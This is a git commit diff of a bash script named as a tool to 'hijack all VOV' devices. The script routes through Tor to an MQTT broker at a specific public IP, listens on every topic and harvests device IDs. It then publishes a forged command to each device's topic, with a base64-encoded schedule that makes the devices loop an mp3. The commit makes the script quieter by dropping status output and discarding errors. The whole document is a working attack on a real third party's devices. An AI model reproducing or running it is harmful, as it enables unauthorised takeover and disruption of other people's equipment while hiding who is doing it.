c73e967c781077d2eacc1edbc23fd7c58a4c8791
troiarcazzoguardi-dev <troiarcazzoguardi@gmail.com>
2026-01-05 14:36:58 -0500

    Update uh.sh

--- uh.sh
+++ uh.sh
@@ -1,30 +1,21 @@
 #!/bin/bash
-# HIJACK_ALL_VOV_FIXED.sh - Peppe Brescia Poeta LOOP (NO -C)
+# HIJACK_ALL_VOV.sh - Peppe.mp3 LOOP
 
-PEPPER_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
 PEPPER_PAYLOAD='[
   {
     "id":51886,
     "show_id":51886,
-    "show_info":"eyJtaWQiOjUxODg2LCJ2ZXJzaW9uIjoxLCJwcmlvIjo5OTksInN1bW1hcnkiOiJQZXBwZSBicmVzY2lhIHBvZXRhIEhJSkFDSy1WT1YzIiwibW9kZSI6MSwicmVwZWF0IjoxLCJkYXlzIjoyMTQ3NDgzNjMyLCJ0cyI6WzE3MjgwMF0sImRzIjpbMTcyODAsMTcyODBdLCJjcmVhdGVkIjoxNzY3NjM1MDAwLCJzdGFydCI6MTc2NzYzMjQwMCwiZXhwaXJlZCI6MTc2OTg3ODc5OSwiZmlsZXMiOlt7ImlkIjo1MTg4NiwiaW5kZXgiOjAsInR5cGUiOjEsInNpemUiOjEyMzQ1Niwic3MiOjEyMzQ1NiwidXJsIjoiaHR0cHM6Ly93d3cubXlpbnN0YW50cy5jb20vbWVkaWEvc291bmRzL3BlcHBlLWJyZXNjaWEtcG9ldGEubXAzIn1dfQ==",
+    "show_info":"eyJtaWQiOjUxODg2LCJ2ZXJzaW9uIjoxLCJwcmlvIjo5OTksInN1bW1hcnkiOiJQZXBwZS5tcDMgSElKQUNLLVZPVjMiLCJtb2RlIjoxLCJyZXBlYXQiOjEsImRheXMiOjIxNDc0ODM2MzIsInRzIjpbMTcyODAwXSwiZHMiOlsxNzI4MCwxNzI4MF0sImNyZWF0ZWQiOjE3Njc2MzUwMDAsInN0YXJ0IjoxNzY3NjMyNDAwLCJleHBpcmVkIjoxNzY5ODc4Nzk5LCJmaWxlcyI6W3siaWQiOjUxODg2LCJpbmRleCI6MCwidHlwZSI6MSwic2l6ZSI6MTIzNDU2LCJzcyI6MTIzNDU2LCJ1cmwiOiJodHRwczovL3d3dy5teWluc3RhbnRzLmNvbS9tZWRpYS9zb3VuZHMvcGVwcGUtYnJlc2NpYS1wb2V0YS5tcDMifV19",
     "action":1,
-    "description":"Peppe Brescia Poeta LOOP",
+    "description":"peppe-brescia-poeta.mp3",
     "version":1,
     "created_at":"2026-01-06T01:00:00.000000000+07:00"
   }
 ]'
 
-echo "=== PEppe Brescia Poeta VOV HIJACK LIVE START ==="
-echo "URL: $PEPPER_URL"
-echo "LOOP: YES"
-
 while read -r line; do
   if [[ $line =~ \"n\":\"([0-9]{17}):[sd]:[0-9]+\" ]]; then
     TOPIC="${BASH_REMATCH[1]}:d:16"
-    echo "ID=$TOPIC HIJACKED → Peppe Brescia Poeta"
-    
-    for i in {1..5}; do
-      torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPER_PAYLOAD" &
-    done
+    torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPER_PAYLOAD" >/dev/null 2>&1 &
   fi
 done < <(torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null)
